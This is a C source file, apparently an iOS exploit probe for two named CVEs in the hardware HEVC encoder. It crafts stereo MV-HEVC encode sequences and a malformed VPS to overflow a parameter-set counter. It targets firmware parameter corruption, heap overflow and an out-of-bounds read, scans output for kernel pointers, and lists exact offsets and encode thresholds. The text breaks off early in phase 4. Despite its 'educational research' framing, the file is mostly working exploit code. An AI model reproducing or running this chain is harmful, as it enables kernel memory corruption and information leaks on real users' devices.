/*
 * ave_full_chain.c — CVE-2026-114025 + CVE-2026-112465 Full Chain Probe
 *
 * Educational research on owned device (iPhone Duo, A20 Pro, iOS 27.1).
 *
 * This probe runs the COMPLETE exploitation sequence:
 * 1. Verify MV-HEVC support
 * 2. Measure NAL sizes and cumsum growth rate
 * 3. Test counter overflow survivability
 * 4. Test OOB READ (CVE-2026-112465) for kernel heap info leak
 * 5. Test firmware parameter corruption (+0x5ED4 -> 56-byte header overwrite)
 * 6. Test cross-buffer OOB with IOSurface spray
 *
 * Key thresholds:
 *   TABLE 1 (buffer+0x3770):
 *   Entry 256 (~86 encodes): First OOB write
 *   Entry 588 (~196 enc): Firmware param array start (+0x5C34)
 *   Entry 592 (~198 enc): +0x5C70 target pointer CORRUPTED → CRASH?
 *   Entry 593 (~198 enc): +0x5C88 source pointer (cumsum field)
 *   *** Entries 592+ REACHABLE ONLY IF firmware memcpy restores +0x5C88 each encode ***
 *   *** Use crash_test mode to determine reachability on-device ***
 *
 *   TABLE 2 (buffer+0x7DF4) — PRIMARY EXPLOITATION PATH:
 *   Entry 256 (~86 encodes): First OOB write
 *   Entry 466 (~155 enc): Past buffer end → HEAP OVERFLOW into adjacent alloc
 *   Safe window: 155-197 encodes (heap overflow without table 1 crash)
 *
 * Build: xcrun -sdk iphoneos clang -arch arm64e -miphoneos-version-min=17.0
 *        -framework VideoToolbox -framework CoreVideo -framework CoreMedia
 *        -framework CoreFoundation -framework IOSurface -framework IOKit
 *        -o AVEFullChain ave_full_chain.c -Wno-deprecated-declarations
 *
 * Bundle ID: com.research.avefullchain
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <dispatch/dispatch.h>
#include <mach/mach.h>
#include <CoreFoundation/CoreFoundation.h>
#include <VideoToolbox/VideoToolbox.h>
#include <CoreVideo/CoreVideo.h>
#include <CoreMedia/CoreMedia.h>
#include <IOKit/IOKitLib.h>
#include <os/log.h>

#ifndef kIOMasterPortDefault
#define kIOMasterPortDefault ((mach_port_t)0)
#endif

typedef struct __IOSurface *IOSurfaceRef;
typedef uint32_t IOSurfaceID;
extern IOSurfaceRef IOSurfaceCreate(CFDictionaryRef properties);
extern IOSurfaceID IOSurfaceGetID(IOSurfaceRef surface);
extern CFTypeRef IOSurfaceCopyValue(IOSurfaceRef surface, CFStringRef key);
extern void IOSurfaceSetValue(IOSurfaceRef surface, CFStringRef key, CFTypeRef value);
extern void *IOSurfaceGetBaseAddress(IOSurfaceRef surface);
extern kern_return_t IOSurfaceLock(IOSurfaceRef surface, uint32_t options, uint32_t *seed);
extern kern_return_t IOSurfaceUnlock(IOSurfaceRef surface, uint32_t options, uint32_t *seed);
extern size_t IOSurfaceGetWidth(IOSurfaceRef surface);
extern size_t IOSurfaceGetHeight(IOSurfaceRef surface);
extern size_t IOSurfaceGetAllocSize(IOSurfaceRef surface);
extern size_t IOSurfaceGetPlaneCount(IOSurfaceRef surface);
extern int32_t IOSurfaceGetUseCount(IOSurfaceRef surface);
extern Boolean IOSurfaceIsInUse(IOSurfaceRef surface);
extern size_t IOSurfaceGetBytesPerRow(IOSurfaceRef surface);

static FILE *g_log = NULL;
static volatile int g_encode_done = 0;
static volatile OSStatus g_cb_status = -999;
static volatile int g_cb_count = 0;
static volatile size_t g_last_pset_count = 0;
static volatile size_t g_last_pset_total_bytes = 0;
static volatile int g_cb_had_buf = 0;
static volatile int g_cb_had_fmt = 0;
static CMFormatDescriptionRef g_saved_fmt = NULL; /* retained fmt desc from last callback */
static uint8_t g_saved_nal[4096]; /* raw encoded NAL bytes from last callback */
static size_t g_saved_nal_len = 0;

static void rlog(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    if (g_log) { vfprintf(g_log, fmt, ap); fflush(g_log); }
    va_end(ap);
    va_start(ap, fmt);
    vprintf(fmt, ap);
    fflush(stdout);
    va_end(ap);
    va_start(ap, fmt);
    char oslogbuf[1024];
    vsnprintf(oslogbuf, sizeof(oslogbuf), fmt, ap);
    va_end(ap);
    os_log(OS_LOG_DEFAULT, "AVE_PROBE: %{public}s", oslogbuf);
}

static void encode_cb(void *ctx, void *src, OSStatus status,
                      VTEncodeInfoFlags flags, CMSampleBufferRef buf) {
    g_cb_status = status;
    g_cb_count++;
    g_encode_done = 1;
    g_cb_had_buf = (buf != NULL) ? 1 : 0;
    g_cb_had_fmt = 0;

    g_saved_nal_len = 0;
    if (buf && status == 0) {
        CMFormatDescriptionRef fmt = CMSampleBufferGetFormatDescription(buf);
        g_cb_had_fmt = (fmt != NULL) ? 1 : 0;
        if (fmt) {
            size_t pset_count = 0;
            CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
                fmt, 0, NULL, NULL, &pset_count, NULL);
            g_last_pset_count = pset_count;

            size_t total = 0;
            for (size_t i = 0; i < pset_count && i < 1000; i++) {
                size_t sz = 0;
                CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
                    fmt, i, NULL, &sz, NULL, NULL);
                total += sz;
            }
            g_last_pset_total_bytes = total;

            if (g_saved_fmt) CFRelease(g_saved_fmt);
            g_saved_fmt = (CMFormatDescriptionRef)CFRetain(fmt);
        }
        /* Save raw encoded NAL data from CMSampleBuffer */
        CMBlockBufferRef bb = CMSampleBufferGetDataBuffer(buf);
        if (bb) {
            size_t bb_len = CMBlockBufferGetDataLength(bb);
            size_t copy_len = (bb_len > sizeof(g_saved_nal)) ? sizeof(g_saved_nal) : bb_len;
            CMBlockBufferCopyDataBytes(bb, 0, copy_len, g_saved_nal);
            g_saved_nal_len = copy_len;
        }
    }
}

static volatile CVPixelBufferRef g_decoded_pb = NULL;
static volatile int g_decode_got_frame = 0;

static void decode_cb(void *refcon, void *src,
                      OSStatus status, VTDecodeInfoFlags flags,
                      CVImageBufferRef buf, CMTime pts, CMTime dur) {
    (void)refcon; (void)src; (void)flags; (void)pts; (void)dur;
    if (status == 0 && buf) {
        g_decoded_pb = (CVPixelBufferRef)CFRetain(buf);
        g_decode_got_frame = 1;
    }
}

static void dump_psets(CMFormatDescriptionRef fmt, size_t baseline) {
    if (!fmt) { rlog("No format description available\n"); return; }
    size_t count = 0;
    CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(fmt, 0, NULL, NULL, &count, NULL);
    rlog("Total parameter sets: %zu (baseline: %zu)\n\n", count, baseline);

    for (size_t i = 0; i < count && i < 500; i++) {
        const uint8_t *ptr = NULL;
        size_t sz = 0;
        int nal_hdr = 0;
        OSStatus st = CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
            fmt, i, &ptr, &sz, NULL, &nal_hdr);
        if (st != 0) {
            rlog("  [%zu] ERROR: %d\n", i, (int)st);
            continue;
        }
        const char *label = (i < baseline) ? "" : " *** OOB ***";
        rlog("  [%zu] nal_hdr=%d size=%zu%s\n", i, nal_hdr, sz, label);

        if (ptr && sz > 0) {
            size_t dump_len = (sz > 256) ? 256 : sz;
            rlog("    ");
            for (size_t j = 0; j < dump_len; j++) {
                rlog("%02x", ptr[j]);
                if ((j + 1) % 32 == 0) rlog("\n    ");
                else if ((j + 1) % 8 == 0) rlog(" ");
            }
            if (dump_len < sz) rlog("... (%zu more bytes)", sz - dump_len);
            rlog("\n");

            /* Scan for kernel pointer patterns: 0xfffffe00XXXXXXXX */
            if (sz >= 8) {
                for (size_t j = 0; j <= sz - 8; j += 4) {
                    uint64_t qw = *(const uint64_t *)(ptr + j);
                    if ((qw >> 40) == 0xfffffe) {
                        rlog("    *** KERNEL PTR at byte %zu: 0x%016llx ***\n",
                             j, (unsigned long long)qw);
                    }
                }
            }
        }
    }
}

/* Global weak-import of iOS 17+ stereo encode API */
extern OSStatus VTCompressionSessionEncodeMultiImageFrame(
    VTCompressionSessionRef session,
    CMTaggedBufferGroupRef taggedBufferGroup,
    CMTime presentationTimeStamp,
    CMTime duration,
    CFDictionaryRef frameProperties,
    void *sourceFrameRefCon,
    VTEncodeInfoFlags *infoFlagsOut)
    __attribute__((weak_import));

static CVPixelBufferRef create_pb(int w, int h) {
    CVPixelBufferRef pb = NULL;
    CFMutableDictionaryRef attrs = CFDictionaryCreateMutable(
        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionaryRef iosurf = CFDictionaryCreate(NULL, NULL, NULL, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(attrs, kCVPixelBufferIOSurfacePropertiesKey, iosurf);
    CVReturn ret = CVPixelBufferCreate(NULL, w, h, kCVPixelFormatType_32BGRA, attrs, &pb);
    CFRelease(iosurf); CFRelease(attrs);
    if (ret != kCVReturnSuccess) return NULL;
    CVPixelBufferLockBaseAddress(pb, 0);
    void *base = CVPixelBufferGetBaseAddress(pb);
    if (base) memset(base, 0x42, w * h * 4);
    CVPixelBufferUnlockBaseAddress(pb, 0);
    return pb;
}

static VTCompressionSessionRef create_mvhevc_encoder(int w, int h, int layer_id) {
    VTCompressionSessionRef session = NULL;
    CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(
        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(enc_spec, CFSTR("EnableHardwareAcceleratedVideoEncoder"),
                         kCFBooleanTrue);
    CFDictionarySetValue(enc_spec, CFSTR("RequireHardwareAcceleratedVideoEncoder"),
                         kCFBooleanTrue);

    OSStatus st = VTCompressionSessionCreate(NULL, w, h,
        kCMVideoCodecType_HEVC, enc_spec, NULL, NULL,
        encode_cb, NULL, &session);
    CFRelease(enc_spec);
    if (st != noErr || !session) return NULL;

    VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
    int kf = 1;
    CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
    CFRelease(kfn);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);

    int base = 0;
    CFNumberRef n0 = CFNumberCreate(NULL, kCFNumberIntType, &base);
    CFNumberRef n1 = CFNumberCreate(NULL, kCFNumberIntType, &layer_id);

    /* MVHEVCVideoLayerIDs */
    CFArrayRef layer_arr = CFArrayCreate(NULL, (const void *[]){n0, n1}, 2, &kCFTypeArrayCallBacks);
    OSStatus sp1 = VTSessionSetProperty(session, kVTCompressionPropertyKey_MVHEVCVideoLayerIDs, layer_arr);
    CFRelease(layer_arr);
    rlog("  MVHEVCVideoLayerIDs(%d,%d): %d\n", base, layer_id, (int)sp1);

    /* MVHEVCViewIDs */
    CFArrayRef view_arr = CFArrayCreate(NULL, (const void *[]){n0, n1}, 2, &kCFTypeArrayCallBacks);
    OSStatus sp2 = VTSessionSetProperty(session, kVTCompressionPropertyKey_MVHEVCViewIDs, view_arr);
    CFRelease(view_arr);
    rlog("  MVHEVCViewIDs: %d\n", (int)sp2);

    /* MVHEVCLeftAndRightViewIDs (REQUIRED for stereo encode) */
    CFArrayRef lr_arr = CFArrayCreate(NULL, (const void *[]){n0, n1}, 2, &kCFTypeArrayCallBacks);
    OSStatus sp3 = VTSessionSetProperty(session, kVTCompressionPropertyKey_MVHEVCLeftAndRightViewIDs, lr_arr);
    CFRelease(lr_arr);
    rlog("  MVHEVCLeftAndRightViewIDs: %d\n", (int)sp3);

    /* HeroEye = left */
    VTSessionSetProperty(session, kVTCompressionPropertyKey_HeroEye, CFSTR("left"));
    /* HasLeftStereoEyeView + HasRightStereoEyeView */
    VTSessionSetProperty(session, kVTCompressionPropertyKey_HasLeftStereoEyeView, kCFBooleanTrue);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_HasRightStereoEyeView, kCFBooleanTrue);
    /* StereoCameraBaseline */
    uint32_t baseline = 64000;
    CFNumberRef bl = CFNumberCreate(NULL, kCFNumberSInt32Type, &baseline);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_StereoCameraBaseline, bl);
    CFRelease(bl);
    /* ProfileLevel Main10 */
    VTSessionSetProperty(session, kVTCompressionPropertyKey_ProfileLevel,
        kVTProfileLevel_HEVC_Main10_AutoLevel);

    CFRelease(n0); CFRelease(n1);

    st = VTCompressionSessionPrepareToEncodeFrames(session);
    if (st != noErr) {
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return NULL;
    }
    return session;
}

/* ---- Bitstream writer for HEVC NAL construction ---- */

typedef struct { uint8_t *buf; size_t cap; size_t byte_pos; int bits_left; } bitwriter_t;

static void bw_init(bitwriter_t *w, uint8_t *buf, size_t cap) {
    w->buf = buf; w->cap = cap; w->byte_pos = 0; w->bits_left = 8;
    memset(buf, 0, cap);
}

static void bw_put_bits(bitwriter_t *w, uint32_t val, int n) {
    for (int i = n - 1; i >= 0; i--) {
        if (w->byte_pos >= w->cap) return;
        w->buf[w->byte_pos] |= ((val >> i) & 1) << (--w->bits_left);
        if (w->bits_left == 0) { w->byte_pos++; w->bits_left = 8; }
    }
}

static void bw_put_ue(bitwriter_t *w, uint32_t val) {
    uint32_t v = val + 1;
    int len = 0; for (uint32_t t = v; t; t >>= 1) len++;
    for (int i = 0; i < len - 1; i++) bw_put_bits(w, 0, 1);
    bw_put_bits(w, v, len);
}

static size_t bw_finish(bitwriter_t *w) {
    if (w->bits_left < 8) {
        w->buf[w->byte_pos] |= (1 << (--w->bits_left));
        w->byte_pos++;
    }
    return w->byte_pos;
}

static size_t build_crafted_vps(uint8_t *buf, size_t buf_sz, int num_layer_sets) {
    if (!buf || buf_sz < 64 || num_layer_sets < 1) return 0;
    buf[0] = 0x40; buf[1] = 0x01;

    bitwriter_t w;
    bw_init(&w, buf + 2, buf_sz - 2);

    bw_put_bits(&w, 0, 4);  /* vps_video_parameter_set_id */
    bw_put_bits(&w, 1, 1);  /* vps_base_layer_internal_flag */
    bw_put_bits(&w, 1, 1);  /* vps_base_layer_available_flag */
    bw_put_bits(&w, 0, 6);  /* vps_max_layers_minus1 */
    bw_put_bits(&w, 0, 3);  /* vps_max_sub_layers_minus1 */
    bw_put_bits(&w, 1, 1);  /* vps_temporal_id_nesting_flag */
    bw_put_bits(&w, 0xFFFF, 16);

    /* profile_tier_level: Main profile, level 4.0 */
    bw_put_bits(&w, 0, 2); bw_put_bits(&w, 0, 1); bw_put_bits(&w, 1, 5);
    bw_put_bits(&w, 0x40000000, 32);
    bw_put_bits(&w, 0, 16); bw_put_bits(&w, 0, 16); bw_put_bits(&w, 0, 16);
    bw_put_bits(&w, 120, 8);

    bw_put_bits(&w, 0, 1);  /* sub_layer_ordering_info_present_flag */
    bw_put_ue(&w, 1);  bw_put_ue(&w, 0);  bw_put_ue(&w, 0);

    bw_put_bits(&w, 63, 6);  /* vps_max_layer_id = 63 */
    bw_put_ue(&w, (uint32_t)(num_layer_sets - 1)); /* OVERFLOW TRIGGER */

    for (int i = 1; i < num_layer_sets; i++) {
        bw_put_bits(&w, 1, 1);
        for (int j = 1; j <= 63; j++) bw_put_bits(&w, 0, 1);
        if (w.byte_pos + 2 >= w.cap) break;
    }

    bw_put_bits(&w, 0, 1);  /* vps_timing_info_present_flag */
    bw_put_bits(&w, 1, 1);  /* vps_extension_flag = 1 */
    for (int i = 0; i < 64 && w.byte_pos + 2 < w.cap; i++)
        bw_put_bits(&w, 0, 8);

    size_t body = bw_finish(&w);
    return 2 + body;
}

/* Build minimal SPS NAL for HEVC decoder */
static size_t build_minimal_sps(uint8_t *buf, size_t buf_sz) {
    if (!buf || buf_sz < 32) return 0;
    buf[0] = 0x42; buf[1] = 0x01; /* nal_unit_type=33 (SPS) */

    bitwriter_t w;
    bw_init(&w, buf + 2, buf_sz - 2);

    bw_put_bits(&w, 0, 4);  /* sps_video_parameter_set_id */
    bw_put_bits(&w, 0, 3);  /* sps_max_sub_layers_minus1 */
    bw_put_bits(&w, 1, 1);  /* sps_temporal_id_nesting_flag */

    /* profile_tier_level */
    bw_put_bits(&w, 0, 2); bw_put_bits(&w, 0, 1); bw_put_bits(&w, 1, 5);
    bw_put_bits(&w, 0x40000000, 32);
    bw_put_bits(&w, 0, 16); bw_put_bits(&w, 0, 16); bw_put_bits(&w, 0, 16);
    bw_put_bits(&w, 120, 8);

    bw_put_ue(&w, 0);  /* sps_seq_parameter_set_id */
    bw_put_ue(&w, 0);  /* chroma_format_idc = 0 (monochrome) */
    bw_put_ue(&w, 128); /* pic_width_in_luma_samples */
    bw_put_ue(&w, 128); /* pic_height_in_luma_samples */
    bw_put_bits(&w, 0, 1); /* conformance_window_flag */
    bw_put_ue(&w, 0);  /* bit_depth_luma_minus8 */
    bw_put_ue(&w, 0);  /* bit_depth_chroma_minus8 */
    bw_put_ue(&w, 4);  /* log2_max_pic_order_cnt_lsb_minus4 */
    bw_put_bits(&w, 0, 1); /* sub_layer_ordering_info_present_flag */
    bw_put_ue(&w, 1); bw_put_ue(&w, 0); bw_put_ue(&w, 0);
    bw_put_ue(&w, 0);  /* log2_min_luma_coding_block_size_minus3 */
    bw_put_ue(&w, 0);  /* log2_diff_max_min_luma_coding_block_size */
    bw_put_ue(&w, 0);  /* log2_min_luma_transform_block_size_minus2 */
    bw_put_ue(&w, 0);  /* log2_diff_max_min_luma_transform_block_size */
    bw_put_ue(&w, 0);  /* max_transform_hierarchy_depth_inter */
    bw_put_ue(&w, 0);  /* max_transform_hierarchy_depth_intra */
    bw_put_bits(&w, 0, 1); /* scaling_list_enabled_flag */
    bw_put_bits(&w, 0, 1); /* amp_enabled_flag */
    bw_put_bits(&w, 0, 1); /* sample_adaptive_offset_enabled_flag */
    bw_put_bits(&w, 0, 1); /* pcm_enabled_flag */
    bw_put_ue(&w, 0);  /* num_short_term_ref_pic_sets */
    bw_put_bits(&w, 0, 1); /* long_term_ref_pics_present_flag */
    bw_put_bits(&w, 0, 1); /* sps_temporal_mvp_enabled_flag */
    bw_put_bits(&w, 0, 1); /* strong_intra_smoothing_enabled_flag */
    bw_put_bits(&w, 0, 1); /* vui_parameters_present_flag */
    bw_put_bits(&w, 0, 1); /* sps_extension_present_flag */

    size_t body = bw_finish(&w);
    return 2 + body;
}

/* Build minimal PPS NAL */
static size_t build_minimal_pps(uint8_t *buf, size_t buf_sz) {
    if (!buf || buf_sz < 16) return 0;
    buf[0] = 0x44; buf[1] = 0x01; /* nal_unit_type=34 (PPS) */

    bitwriter_t w;
    bw_init(&w, buf + 2, buf_sz - 2);

    bw_put_ue(&w, 0);  /* pps_pic_parameter_set_id */
    bw_put_ue(&w, 0);  /* pps_seq_parameter_set_id */
    bw_put_bits(&w, 0, 1); /* dependent_slice_segments_enabled_flag */
    bw_put_bits(&w, 0, 1); /* output_flag_present_flag */
    bw_put_bits(&w, 0, 3); /* num_extra_slice_header_bits */
    bw_put_bits(&w, 0, 1); /* sign_data_hiding_enabled_flag */
    bw_put_bits(&w, 0, 1); /* cabac_init_present_flag */
    bw_put_ue(&w, 0); bw_put_ue(&w, 0);
    bw_put_ue(&w, 0);  /* init_qp_minus26 (se, but 0 is same) */
    bw_put_bits(&w, 0, 1); /* constrained_intra_pred_flag */
    bw_put_bits(&w, 0, 1); /* transform_skip_enabled_flag */
    bw_put_bits(&w, 0, 1); /* cu_qp_delta_enabled_flag */
    bw_put_bits(&w, 0, 1); /* pps_slice_chroma_qp_offsets_present_flag */
    bw_put_bits(&w, 0, 1); /* weighted_pred_flag */
    bw_put_bits(&w, 0, 1); /* weighted_bipred_flag */
    bw_put_bits(&w, 0, 1); /* transquant_bypass_enabled_flag */
    bw_put_bits(&w, 0, 1); /* tiles_enabled_flag */
    bw_put_bits(&w, 0, 1); /* entropy_coding_sync_enabled_flag */
    bw_put_bits(&w, 0, 1); /* pps_loop_filter_across_slices_enabled_flag */
    bw_put_bits(&w, 0, 1); /* deblocking_filter_control_present_flag */
    bw_put_bits(&w, 0, 1); /* pps_scaling_list_data_present_flag */
    bw_put_bits(&w, 0, 1); /* lists_modification_present_flag */
    bw_put_ue(&w, 0);  /* log2_parallel_merge_level_minus2 */
    bw_put_bits(&w, 0, 1); /* slice_segment_header_extension_present_flag */
    bw_put_bits(&w, 0, 1); /* pps_extension_present_flag */

    size_t body = bw_finish(&w);
    return 2 + body;
}

static int encode_one(VTCompressionSessionRef session, int frame_idx, int w, int h) {
    CVPixelBufferRef pb = create_pb(w, h);
    if (!pb) return -1;
    g_encode_done = 0;
    g_cb_status = -999;
    CMTime pts = CMTimeMake(frame_idx, 30);
    CMTime dur = CMTimeMake(1, 30);
    OSStatus st = VTCompressionSessionEncodeFrame(session, pb, pts, dur, NULL, NULL, NULL);
    if (st != noErr) {
        rlog("  EncodeFrame error: %d\n", (int)st);
        CVPixelBufferRelease(pb);
        return (int)st;
    }
    /* Poll for callback — do NOT use CompleteFrames here as it blocks if
       the encoder never produces output (observed on iPhone Duo A20 Pro). */
    for (int i = 0; i < 300 && !g_encode_done; i++) usleep(10000); /* 3s */
    CVPixelBufferRelease(pb);
    if (!g_encode_done) {
        rlog("  WARNING: callback not received after 3s (status=%d)\n", (int)g_cb_status);
    }
    return (int)g_cb_status;
}

static CVPixelBufferRef create_yuv_pb_stereo(int w, int h, uint8_t y_fill) {
    CVPixelBufferRef pb = NULL;
    CFMutableDictionaryRef attrs = CFDictionaryCreateMutable(
        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionaryRef iosurf = CFDictionaryCreate(NULL, NULL, NULL, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(attrs, kCVPixelBufferIOSurfacePropertiesKey, iosurf);
    CVReturn ret = CVPixelBufferCreate(NULL, w, h,
        kCVPixelFormatType_420YpCbCr8BiPlanarFullRange, attrs, &pb);
    CFRelease(iosurf); CFRelease(attrs);
    if (ret != kCVReturnSuccess) return NULL;
    CVPixelBufferLockBaseAddress(pb, 0);
    void *yp = CVPixelBufferGetBaseAddressOfPlane(pb, 0);
    void *uvp = CVPixelBufferGetBaseAddressOfPlane(pb, 1);
    if (yp) memset(yp, y_fill, CVPixelBufferGetBytesPerRowOfPlane(pb, 0) * h);
    if (uvp) memset(uvp, 128, CVPixelBufferGetBytesPerRowOfPlane(pb, 1) * (h / 2));
    CVPixelBufferUnlockBaseAddress(pb, 0);
    return pb;
}

static int encode_one_stereo_kf(VTCompressionSessionRef session, int frame_idx, int w, int h, int layer_id, int force_kf) {
    if (!VTCompressionSessionEncodeMultiImageFrame) return -99;
    CVPixelBufferRef pb_left = create_yuv_pb_stereo(w, h, 0x40);
    CVPixelBufferRef pb_right = create_yuv_pb_stereo(w, h, 0x80);
    if (!pb_left || !pb_right) {
        if (pb_left) CVPixelBufferRelease(pb_left);
        if (pb_right) CVPixelBufferRelease(pb_right);
        return -1;
    }
    CMTag tl0 = CMTagMakeWithSInt64Value(kCMTagCategory_VideoLayerID, 0);
    CMTag left_tags[2] = { kCMTagStereoLeftEye, tl0 };
    CMTagCollectionRef ltc = NULL;
    CMTagCollectionCreate(NULL, left_tags, 2, &ltc);
    CMTag tl1 = CMTagMakeWithSInt64Value(kCMTagCategory_VideoLayerID, layer_id);
    CMTag right_tags[2] = { kCMTagStereoRightEye, tl1 };
    CMTagCollectionRef rtc = NULL;
    CMTagCollectionCreate(NULL, right_tags, 2, &rtc);
    CMTagCollectionRef tcs[2] = { ltc, rtc };
    CVPixelBufferRef pbs[2] = { pb_left, pb_right };
    CFArrayRef tc_arr = CFArrayCreate(NULL, (const void **)tcs, 2, &kCFTypeArrayCallBacks);
    CFArrayRef pb_arr = CFArrayCreate(NULL, (const void **)pbs, 2, &kCFTypeArrayCallBacks);
    CMTaggedBufferGroupRef tbg = NULL;
    OSStatus tbg_st = CMTaggedBufferGroupCreate(NULL, tc_arr, pb_arr, &tbg);
    CFRelease(tc_arr); CFRelease(pb_arr);
    if (tbg_st != 0 || !tbg) {
        CFRelease(ltc); CFRelease(rtc);
        CVPixelBufferRelease(pb_left); CVPixelBufferRelease(pb_right);
        return -2;
    }
    g_encode_done = 0;
    g_cb_status = -999;
    VTEncodeInfoFlags fi = 0;
    CMTime pts = CMTimeMake(frame_idx, 30);
    CMTime dur = CMTimeMake(1, 30);
    CFDictionaryRef props = NULL;
    if (force_kf) {
        CFMutableDictionaryRef mp = CFDictionaryCreateMutable(NULL, 1,
            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
        CFDictionarySetValue(mp, kVTEncodeFrameOptionKey_ForceKeyFrame, kCFBooleanTrue);
        props = mp;
    }
    OSStatus st = VTCompressionSessionEncodeMultiImageFrame(
        session, tbg, pts, dur, props, NULL, &fi);
    if (props) CFRelease(props);
    if (st != noErr) {
        CFRelease(tbg); CFRelease(ltc); CFRelease(rtc);
        CVPixelBufferRelease(pb_left); CVPixelBufferRelease(pb_right);
        return (int)st;
    }
    for (int i = 0; i < 500 && !g_encode_done; i++) usleep(10000);
    CFRelease(tbg); CFRelease(ltc); CFRelease(rtc);
    CVPixelBufferRelease(pb_left); CVPixelBufferRelease(pb_right);
    if (!g_encode_done) {
        rlog("  WARNING: stereo callback not received after 5s\n");
    }
    return (int)g_cb_status;
}

static int encode_one_stereo_lid(VTCompressionSessionRef session, int frame_idx, int w, int h, int layer_id) {
    return encode_one_stereo_kf(session, frame_idx, w, h, layer_id, 0);
}

static int encode_one_stereo(VTCompressionSessionRef session, int frame_idx, int w, int h) {
    return encode_one_stereo_kf(session, frame_idx, w, h, 1, 0);
}

/* Phase 1: Verify MV-HEVC */
static int phase1_verify(void) {
    rlog("\n========== PHASE 1: MV-HEVC Support ==========\n");
    if (!VTCompressionSessionEncodeMultiImageFrame) {
        rlog("FAILED: EncodeMultiImageFrame not available (needs iOS 17+)\n");
        return -1;
    }
    VTCompressionSessionRef s = create_mvhevc_encoder(1920, 1080, 1);
    if (!s) {
        rlog("FAILED: MV-HEVC not supported on this device\n");
        rlog("MV-HEVC requires iPhone 15 Pro or later.\n");
        return -1;
    }
    int st = encode_one_stereo(s, 0, 1920, 1080);
    rlog("First stereo encode: status=%d, pset_count=%zu, bytes=%zu\n",
         st, g_last_pset_count, g_last_pset_total_bytes);
    VTCompressionSessionInvalidate(s); CFRelease(s);
    if (st != 0) {
        rlog("FAILED: Stereo encode error %d\n", st);
        return -1;
    }
    rlog("PASS: MV-HEVC stereo encoder works, %zu parameter sets per frame\n", g_last_pset_count);
    return 0;
}

/* Phase 2: Measure NAL sizes and cumsum growth */
static int phase2_measure(void) {
    rlog("\n========== PHASE 2: NAL Size Measurement ==========\n");
    rlog("Each MV-HEVC stereo encode produces ~4 NAL entries (VPS+SPS+SPS+PPS)\n");
    rlog("Entry format: [NAL_type(4), layer_id(4), cumsum(4), data>>3(4)]\n");
    rlog("OOB starts when counter > 256 entries (~64 encodes with pset=4)\n\n");

    VTCompressionSessionRef s = create_mvhevc_encoder(1920, 1080, 1);
    if (!s) return -1;

    for (int i = 0; i < 10; i++) {
        int st = encode_one_stereo(s, i, 1920, 1080);
        rlog("[%d] status=%d, psets=%zu, total_bytes=%zu\n",
             i, st, g_last_pset_count, g_last_pset_total_bytes);
        if (st != 0) break;
    }
    VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
    usleep(500000);
    VTCompressionSessionInvalidate(s); CFRelease(s);

    rlog("\nExpected: ~4 entries/encode, cumsum grows with 1920x1080 frames\n");
    rlog("Cumsum limit: 0x801 (2049) — check if large frames stay under\n");
    return 0;
}

/* Phase 3: Counter overflow */
static int phase3_overflow(int max_encodes) {
    rlog("\n========== PHASE 3: Counter Overflow (%d encodes) ==========\n", max_encodes);
    rlog("OOB entry thresholds (table 1, pset=4/enc):\n");
    rlog("  256 (~64 enc): First write past VPS sub-object boundary\n");
    rlog("  588 (~147 enc): Firmware param array +0x5C34\n");
    rlog("  592 (~148 enc): +0x5C70 target pointer — CRASH BOUNDARY\n");
    rlog("OOB entry thresholds (table 2 — PRIMARY PATH):\n");
    rlog("  466 (~117 enc): Past buffer end → HEAP OVERFLOW\n\n");

    VTCompressionSessionRef s = create_mvhevc_encoder(1920, 1080, 1);
    if (!s) return -1;

    int first_error = -1;
    int errors = 0;
    for (int i = 0; i < max_encodes; i++) {
        int st = encode_one_stereo(s, i, 1920, 1080);
        if (st != 0) {
            if (first_error < 0) first_error = i;
            errors++;
            rlog("[%d] ERROR: %d (total errors: %d)\n", i, st, errors);
            if (errors >= 10) {
                rlog("Too many errors, stopping\n");
                break;
            }
        }
        if ((i+1) % 25 == 0 || i == max_encodes-1) {
            int est_entries = (i+1) * 3;
            rlog("[%d/%d] psets=%zu, bytes=%zu, errors=%d, ~%d entries (OOB: %s)\n",
                 i+1, max_encodes, g_last_pset_count, g_last_pset_total_bytes, errors,
                 est_entries, est_entries > 256 ? "YES" : "no");
        }
    }

    VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
    usleep(500000);
    VTCompressionSessionInvalidate(s); CFRelease(s);

    if (first_error >= 0)
        rlog("\nFIRST ERROR at encode %d (~%d entries)\n", first_error, first_error * 3);
    else
        rlog("\nALL %d ENCODES SUCCEEDED — OOB corruption occurred SILENTLY\n", max_encodes);

    return errors;
}

/* Phase 4: OOB Read test (CVE-2026-112465) */
static int phase4_oob_read(int encodes) {
    rlog("\n========== PHASE 4: OOB Read (CVE-2026-112465) ==========\n");
    rlog("After counter overflow, READ path at 0x18a9610 iterates past boundary\n");
    rlog("CMVideoFormatDescriptionGetHEVCParameterSetAtIndex may return heap data\n");
    rlog("Encoding %d frames, tracking parameter set count/size changes\n\n", encodes);

    VTCompressionSessionRef s = create_mvhevc_encoder(128, 128, 1);
    if (!s) return -1;

    size_t baseline_count = 0, baseline_bytes = 0;
